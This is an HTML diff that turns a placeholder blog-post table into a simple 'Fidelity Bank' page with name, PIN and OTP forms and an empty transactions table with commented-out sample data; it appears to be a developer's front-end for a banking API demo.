@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -6,108 +5,133 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="styles/index-style.css">
-    <title>Document</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <script src='script.js'></script>
+    <title>Fidelity</title>
+
+    <style>
+        #wrapper {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        input {
+            display: block;
+            margin: auto;
+            margin-bottom: 20px;
+        }
+
+        input[type='text'] {
+            width: 40%;
+            height: 40px;
+        }
+
+        input[type='submit'] {
+            width: 40%;
+            height: 35px;
+        }
+
+        table {
+            width: 100%;
+            text-align: center;
+        }
+
+        h3 {
+            padding: 2px;
+            margin: 0;
+            font-size: 16px;
+        }
+
+        span {
+            font-weight: normal;
+        }
+    </style>
 </head>
 
 <body>
-    <section id="wrapper">
-        <h1>All Posts</h1>
-        <table>
-            <colgroup>
-                <col style="width:5%">
-                <col style="width:20%">
-                <col style="width:35%">
-                <col style="width:10%">
-                <col style="width:10%">
-                <col style="width:20%">
-            </colgroup>
+    <div id="wrapper">
+        <h1 style="text-align:center">Fidelity Bank</h1>
+        <form id="form" method="post" action="#">
+            <input type="text" name='name' id="name">
+            <input type="text" name='pin' id='pin'>
+            <input type='submit' value='Send OTP' />
+        </form>
 
-            <thead>
+
+        <form id="form-otp" method="post" action="#">
+            <input type="text" placeholder="Enter OTP" name='otp' id='otp'>
+            <input type='submit' value='Get Transactions' />
+        </form>
+
+
+
+        <div style="display: flex; justify-content: center; flex-direction:column; margin: 0 30px 0 30px;">
+            <h1>Transactions</h1>
+            <div id="account-info">
+                <!-- <h3>Account: <span>Fidelity</span></h3>
+                <h3>Name: <span>Ben Acq</span></h3>
+                <h3>Account No: <span>4343232324</span></h3>
+                <h3>Balance: <span>GHS 433</span></h3>
+                <h3>Eligible loan amount: <span>GHS 23</span></h3> -->
+            </div>
+
+            <table border="1">
                 <tr>
-                    <th>#</th>
-                    <th>Title</th>
-                    <th>Content</th>
-                    <th>Image</th>
-                    <th>Created At</th>
-                    <th>Actions</th>
+                    <th>Balance(GHS)</th>
+                    <th>Credit(GHS)</th>
+                    <th>Debit(GHS)</th>
+                    <th>Date</th>
+                    <th>Description</th>
                 </tr>
-            </thead>
-            <tbody>
-                <tr>
-                    <th>1</th>
-                    <td>Lorem ipsum, dolor sit amet consectetur</td>
-                    <td>
-                        Lorem ipsum, dolor sit amet consectetur adipisicing elit. Impedit hic velit tempora eveniet modi
-                        ab nostrum dolorem vel, adipisci omnis, sit a qui? Temporibus, aliquam? Suscipit autem nobis,
-                        consequatur unde magni dignissimos
-                    </td>
-                    <td>
-                        <div class="image-wrapper">
-                            <img src='assets/images/img-37.jpg' />
-                        </div>
-                    </td>
-                    <td>12-03-2021</td>
-                    <td>
-                        <a class='btn edit-btn' href="./edit.html">
-                            Edit
-                        </a>
-                        <a class='btn view-btn' href="./show.html">
-                            View
-                        </a>
-                    </td>
-                </tr>
-                <tr>
-                    <th>2</th>
-                    <td>Lorem ipsum, dolor sit amet consectetur</td>
-                    <td>
-                        Lorem ipsum, dolor sit amet consectetur adipisicing elit. Impedit hic velit tempora eveniet modi
-                        ab nostrum dolorem vel, adipisci omnis, sit a qui? Temporibus, aliquam? Suscipit autem nobis,
-                        consequatur unde magni dignissimos
-                    </td>
-                    <td>
-                        <div class="image-wrapper">
-                            <img src='assets/images/img-37.jpg' />
-                        </div>
-                    </td>
-                    <td>12-03-2021</td>
-                    <td>
-                        <a class='btn edit-btn' href="./edit.html">
-                            Edit
-                        </a>
-                        <a class='btn view-btn' href="./show.html">
-                            View
-                        </a>
-                    </td>
-                </tr>
-                <tr>
-                    <th>3</th>
-                    <td>Lorem ipsum, dolor sit amet consectetur</td>
-                    <td>Lorem ipsum, dolor sit amet consectetur adipisicing elit. Impedit hic velit tempora eveniet modi
-                        ab nostrum dolorem vel, adipisci omnis, sit a qui? Temporibus, aliquam? Suscipit autem nobis,
-                        consequatur unde magni dignissimos</td>
-                    <td>
-                        <div class="image-wrapper">
-                            <img src='assets/images/img-37.jpg' />
-                        </div>
-                    </td>
-                    <td>12-03-2021</td>
-                    <td>
-                        <a class='btn edit-btn' href="./edit.html">
-                            Edit
-                        </a>
-                        <a class='btn view-btn' href="./show.html">
-                            View
-                        </a>
-                    </td>
-                </tr>
-            </tbody>
-        </table>
+                <tbody id="table-body">
 
 
-    </section>
+                    <!-- <tr>
+                        <td>January</td>
+                        <td>$100</td>
+                        <td>January</td>
+                        <td>$100</td>
+                        <td>January</td>
+
+                    </tr>
+
+                    <tr>
+                        <td>January</td>
+                        <td>$100</td>
+                        <td>January</td>
+                        <td>$100</td>
+                        <td>January</td>
+                    </tr>
 
 
+                    <tr>
+                        <td>January</td>
+                        <td>$100</td>
+                        <td>January</td>
+                        <td>$100</td>
+                        <td>January</td>
+
+                    </tr>
+
+
+                    <tr>
+                        <td>January</td>
+                        <td>$100</td>
+                        <td>January</td>
+                        <td>$100</td>
+                        <td>January</td>
+                    </tr> -->
+
+
+                </tbody>
+            </table>
+        </div>
+
+    </div>
 
 
 </body>
